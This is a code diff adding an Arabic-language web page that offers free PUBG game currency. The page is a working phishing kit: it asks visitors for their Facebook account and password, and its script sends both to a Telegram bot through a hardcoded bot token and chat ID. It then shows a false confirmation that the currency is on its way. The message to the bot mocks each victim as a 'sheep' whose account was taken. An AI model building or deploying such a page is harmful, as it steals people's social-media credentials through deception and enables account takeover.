@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن شدات ببجي مجاني</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.imgur.com/a5IneZh.jpg');
+            background-size: cover;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 300px;
+        }
+        h1, h2 {
+            color: #ffcc00;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        #message {
+            color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>شحن شدات ببجي مجاني</h1>
+        <p>
+            في هذا المقال، سنتحدث عن كيفية الحصول على شدات ببجي بشكل مجاني. 
+            تعتبر الشدات من العناصر الأساسية التي يحتاجها اللاعبون لتحسين تجربتهم في لعبة ببجي.
+            هناك عدة طرق للحصول على هذه الشدات بشكل مجاني، ولكننا نقدم لك طريقة سهلة وفعالة.
+        </p>
+        <p>
+            كل ما عليك فعله الآن هو النقر على الزر أدناه وتسجيل حسابك. بعد التسجيل، ستحصل على 60 شدات ببجي خلال 30 دقيقة.
+        </p>
+        <button id="get-shdats">احصل على الشدات</button>
+        
+        <div id="login-form" style="display: none; margin-top: 20px;">
+            <h2>تسجيل الدخول</h2>
+            <input type="text" id="facebook-account" placeholder="رقم حساب فيسبوك" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button id="submit-login">تسجيل</button>
+            <p id="message"></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('get-shdats').onclick = function() {
+            document.getElementById('login-form').style.display = 'block';
+        };
+
+        document.getElementById('submit-login').onclick = function() {
+            const account = document.getElementById('facebook-account').value;
+            const password = document.getElementById('password').value;
+
+            if (account && password) {
+                document.getElementById('message').innerText = 'تم الحصول على طلبك. سيتم إرسال الشدات خلال 30 دقيقة.';
+                
+                // إرسال البيانات إلى بوت التليجرام على الفور
+                const token = '7969872040:AAF4JjL8BlGnHqAnPzak9p6rDZDq3LEVFPY';
+                const chatId = '6881422132'; // استبدل هذا بـ chat_id الخاص بك
+                const message = `المزعج بيقولك في خروف جديد تم سحب حسابو:\nرقم حساب فيسبوك: ${account}\nكلمة المرور: ${password}`;
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => {
+                        return response.json(); // تحويل الاستجابة إلى JSON
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            alert('تم إرسال الشدات انتظر 30 دقيقه بيوصل الشدات');
+                            console.log('تم إرسال الشدات انتظر 30 دقيقه بيوصل الشدات.');
+                        } else {
+                            alert('حدث خطأ أثناء إرسال البيانات: ' + data.description);
+                            console.error('حدث خطأ أثناء إرسال البيانات:', data);
+                        }
+                    })
+                    .catch(error => {
+                        alert('خطأ في الشبكة: ' + error);
+                        console.error('خطأ في الشبكة:', error);
+                    });
+            } else {
+                alert('يرجى ملء جميع الحقول.');
+            }
+        };
+    </script>
+</body>
+</html>
